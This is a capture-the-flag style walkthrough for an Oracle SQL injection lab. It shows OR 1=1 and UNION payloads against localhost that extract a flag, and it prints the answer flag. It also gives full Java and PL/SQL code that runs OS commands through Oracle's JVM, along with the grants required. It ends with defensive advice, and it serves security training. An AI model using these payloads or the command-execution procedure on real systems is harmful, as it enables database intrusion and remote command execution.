<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab12" \<br> --data-urlencode "status=' OR 1=1 -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- <br>
        <span class="prompt">SQL: </span>SELECT id, hostname, ip_addr, status FROM servers WHERE status = '' OR 1=1 -- '<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Hostname:</strong> web-01.internal: <strong>IP:</strong> 10.10.1.1: <strong>Status:</strong> running<br>
        <strong>Hostname:</strong> db-01.internal: <strong>IP:</strong> 10.10.1.2: <strong>Status:</strong> running<br>
        <strong>Hostname:</strong> app-01.internal: <strong>IP:</strong> 10.10.1.3: <strong>Status:</strong> stopped
    </div>
</div>

<h4>Step 2: Enumerate Tables and Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "status=XXXXNOMATCH' UNION SELECT 0, table_name, 'x', 'x' FROM user_tables -- "<br>
        <span class="prompt">Output: </span>SERVERS, <strong>RCE_FLAGS</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab12" \<br> --data-urlencode "status=XXXXNOMATCH' UNION SELECT id, flag, 'x', 'x' FROM rce_flags -- "<br>
        <span class="prompt">Output: </span><strong>Hostname:</strong> <strong>FLAG{or_j4v4_st0r3d_rc3}</strong>
    </div>
</div>

<h4>Step 3: Java Stored Procedure RCE (Conceptual)</h4>
<p>
    Oracle includes an embedded JVM. With sufficient privileges, an attacker creates a Java class
    that calls <code>Runtime.exec()</code> and wraps it as a PL/SQL stored procedure.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Java RCE Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>Create Java source:<br>
        CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCmd" AS<br>
        import java.io.*;<br>
        public class OSCmd {<br>
        &nbsp;&nbsp;public static String exec(String cmd) throws Exception {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;Process p = Runtime.getRuntime().exec(cmd);<br>
        &nbsp;&nbsp;&nbsp;&nbsp;BufferedReader br = new BufferedReader(<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new InputStreamReader(p.getInputStream()));<br>
        &nbsp;&nbsp;&nbsp;&nbsp;StringBuilder sb = new StringBuilder();<br>
        &nbsp;&nbsp;&nbsp;&nbsp;String line;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;while ((line = br.readLine()) != null) sb.append(line + "\n");<br>
        &nbsp;&nbsp;&nbsp;&nbsp;return sb.toString();<br>
        &nbsp;&nbsp;}<br>
        };<br><br>
        <span class="prompt">Step 2: </span>Create PL/SQL wrapper:<br>
        CREATE OR REPLACE FUNCTION os_exec(cmd VARCHAR2) RETURN VARCHAR2<br>
        AS LANGUAGE JAVA NAME 'OSCmd.exec(java.lang.String) return java.lang.String';<br><br>
        <span class="prompt">Step 3: </span>Execute: SELECT os_exec('id') FROM DUAL;<br>
        <span class="prompt">Result: </span>uid=1001(oracle) gid=1001(oinstall)
    </div>
</div>

<h4>Step 4: Required Privileges</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Privilege Requirements</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">CREATE PROCEDURE: </span>To create Java source and PL/SQL wrapper<br>
        <span class="prompt">JAVAUSERPRIV:     </span>Java user privileges (or JAVASYSPRIV)<br>
        <span class="prompt">DBMS_JAVA grants: </span><br>
        EXEC DBMS_JAVA.GRANT_PERMISSION('USER', 'SYS:java.io.FilePermission', '&lt;&lt;ALL FILES&gt;&gt;', 'execute');<br>
        EXEC DBMS_JAVA.GRANT_PERMISSION('USER', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_j4v4_st0r3d_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab12" \<br> --data-urlencode "status=XXXXNOMATCH' UNION SELECT id, flag, 'x', 'x' FROM rce_flags -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Hostname:</strong> FLAG{or_j4v4_st0r3d_rc3}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle's embedded JVM enables RCE through Java stored procedures.
    <code>Runtime.getRuntime().exec()</code> runs OS commands as the Oracle process owner. This is
    one of the most dangerous post-exploitation techniques in Oracle. Defense: revoke
    <code>CREATE PROCEDURE</code> and <code>JAVAUSERPRIV</code> from non-admin users, disable the
    JVM if not needed, use bind variables, and implement least-privilege database accounts.
</div>
